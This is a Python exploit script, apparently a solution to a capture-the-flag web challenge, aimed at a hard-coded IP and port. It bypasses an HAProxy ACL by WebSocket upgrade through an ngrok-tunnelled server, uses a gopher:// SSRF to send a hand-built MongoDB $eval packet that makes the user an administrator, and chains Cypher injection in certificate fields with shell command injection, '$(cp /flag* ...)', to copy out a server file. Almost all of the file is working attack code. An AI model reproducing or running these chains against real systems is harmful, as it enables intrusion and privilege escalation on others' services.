from flask import Flask
from pwn import log
import multiprocessing
import socket
import requests
import time
import struct
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from datetime import datetime, timedelta

HOST = "83.136.253.251"
PORT = "48052"
URL = f"http://{HOST}:{PORT}"
USERNAME, PASSWORD = "gh0st", "gh0st"

def mongodb_set_administrator():
    OP_MSG = [
    0x00, 0x00, 0x00, 0x00,      # request id
    0x00, 0x00, 0x00, 0x00,      # responseto
    0xDD, 0x07, 0x00, 0x00,      # OP_MSG (0x7dd = 2013)
    0x00, 0x00, 0x00, 0x00,      # message flags
    0x00                         # body kind
    ]

    payload = f"""db.runCommand({{update:\"users\",updates:[{{q:{{\"username\":\"{USERNAME}\"}},u:{{$set:{{\"permission\":\"administrator\"}}}}}}]}})"""
    log.info(f"MongoDB command: {payload}")    

    document = [
        # 0x00, 0x00, 0x00, 0x00,                   # total document body size
        0x0d,                                       # type is javascript code 
        ] + list(bytearray(b"$eval")) + [           # element
        0x00,                                       # end
        ] + pack_size(len(payload)+1) + [           # length
        ] + list(bytearray(payload.encode())) + [   # value
        0x00, 
        0x04                                        # type is array
        ] + list(bytearray(b"args")) + [            # element
        0x00,                                       # end
        0x05, 0x00, 0x00, 0x00,                     # length
        0x00,                                       # empty
        0x03                                        # type is document
        ] + list(bytearray(b"lsid")) + [            # element
        0x00,                                       # end
        0x1e, 0x00, 0x00, 0x00,                     # length
        0x05,                                       # type is binary
        ] + list(bytearray(b"id")) + [              # element
        0x00,                                       # end
        0x10, 0x00, 0x00, 0x00,                     # length
        0x04, 
        0x1d, 0x62, 0x89, 0x5c, 0x03, 0x55, 
        0x4d, 0x4e, 0xb5, 0xe1, 0xe6, 0xa3,
        0xeb, 0x0b, 0x82, 0xff, 
        0x00,                                       # end
        0x02,                                       # type is string
        ] + list(bytearray(b"$db")) + [             # element
        0x00,                                       # end
        0x0a, 0x00, 0x00, 0x00,                     # length
        ] + list(bytearray(b"percetron")) + [ 
        0x00,                                       # end
        0x03                                        # type is document
        ] + list(bytearray(b"$readPreference")) + [
        0x00,                                       # end
        0x20, 0x00, 0x00, 0x00,                     # length 
        0x02,                                       # type is string
        ] + list(bytearray(b"mode")) + [
        0x00,                                       # end
        0x11, 0x00, 0x00, 0x00,                     # length
        ] + list(bytearray(b"primaryPreferred")) + [# value
        0x00, 0x00, 0x00
    ]

    return encode(construct_query(OP_MSG, document))

def serve():
    app = Flask(__name__)
    
    @app.route("/")
    def index():
        return "", 101

    app.run(host="0.0.0.0", port=8000, debug=False)

def pack_size(section):
    return list(struct.pack("<i", section))

def construct_query(OP_MSG, document):
    message_length = len(OP_MSG) + 4
    document_length = len(document) + 4

    total_size = pack_size(message_length + document_length)
    return "".join(map(lambda x: "{:02x}".format(x), total_size + OP_MSG + pack_size(document_length) + document))

def encode(data):
    packet = ""
    for i in range(int(len(data) / 2)):
        packet += "%" + data[2*i:2*(i+1)]
    return packet

def generate_cert(domain, org, locality, state, country):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    public_key = private_key.public_key()

    subject = x509.Name([
        x509.NameAttribute(x509.NameOID.COUNTRY_NAME, country),
        x509.NameAttribute(x509.NameOID.STATE_OR_PROVINCE_NAME, state),
        x509.NameAttribute(x509.NameOID.LOCALITY_NAME, locality),
        x509.NameAttribute(x509.NameOID.ORGANIZATION_NAME, org),
        x509.NameAttribute(x509.NameOID.COMMON_NAME, domain),
    ])

    builder = x509.CertificateBuilder()
    builder = builder.subject_name(subject)
    builder = builder.issuer_name(subject)
    builder = builder.public_key(public_key)
    builder = builder.serial_number(x509.random_serial_number())
    builder = builder.not_valid_before(datetime.utcnow())
    builder = builder.not_valid_after(datetime.utcnow() + timedelta(days=365))

    cert = builder.sign(
        private_key=private_key,
        algorithm=hashes.SHA256(),
        backend=default_backend()
    )

    private_key_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    ).decode("utf-8")

    public_key_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode("utf-8")

    cert_pem = cert.public_bytes(
        encoding=serialization.Encoding.PEM
    ).decode("utf-8")

    return {
        "privKey": private_key_pem,
        "pubKey": public_key_pem,
        "pem": cert_pem
    }

def cypher_injection(file_name):
    part_1 = f"payload.com', org_name: 'a', locality_name: 'a', file_name: '{file_name}',/*"
    part_2 = "*/state_name: 'a"
    return [part_1, part_2]

def register_and_login():
    session = requests.Session()

    log.info(f"Trying to register user {USERNAME}:{PASSWORD}")
    session.post(URL + "/panel/register", json={"username": USERNAME, "password": PASSWORD})
    log.info(f"Logging in with user {USERNAME}:{PASSWORD}")
    session.post(URL + "/panel/login", json={"username": USERNAME, "password": PASSWORD})

    return session.cookies['connect.sid']


def establish_websocket():
    controlled_server = "http://0.tcp.ap.ngrok.io:12618"
    sid = "connect.sid=" + register_and_login()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, int(PORT)))
    
    log.info("Establishing Websocket to backend for bypassing HAProxy ACL")

    req1 = f"GET /healthcheck?url={controlled_server}/ HTTP/1.1\r\nHost: 127.0.0.1:1337\r\nCookie: {sid}\r\n\r\n"
    s.sendall(req1.encode())
    s.recv(4096)
    
    mongo_packet = mongodb_set_administrator()
    ssrf = "gopher://127.0.0.1:27017/_" + mongo_packet
    log.info("Updating user's role to administrator")
    log.info(f"Mongo Packet: {mongo_packet}")

    log.info(f"SSRF to {ssrf}")

    req2 = f"GET /healthcheck-dev?url={ssrf} HTTP/1.1\r\nHost: 127.0.0.1:1337\r\nCookie: {sid}\r\n\r\n"
    s.sendall(req2.encode())
    s.recv(4096)

    s.shutdown(socket.SHUT_RDWR)

def certificate_cypher_and_command_injection(sid):
    command_injection = "/app/certificates/test$(cp /flag* /app/static/css/flag.txt)/test.cert"

    cypher_1, cypher_2 = cypher_injection(command_injection)

    cert = generate_cert(cypher_1, "Organization", "City", cypher_2, "ID")
    cookies = {"connect.sid": sid}
    requests.post(f"http://{HOST}:{PORT}/panel/management/addcert", cookies=cookies,  data=cert)

def trigger_command_injection(sid):
    requests.get(f"http://{HOST}:{PORT}/panel/management/dl-certs", cookies={"connect.sid": sid})

if __name__ == "__main__":
    server = multiprocessing.Process(target=serve)
    server.start()
    time.sleep(1)

    establish_websocket()
    log.info("Relogging to get the updated permission")
    sid = register_and_login()
    
    certificate_cypher_and_command_injection(sid)
    trigger_command_injection(sid)

    r = requests.get(f"http://{HOST}:{PORT}/static/css/flag.txt")
    print(r.text)
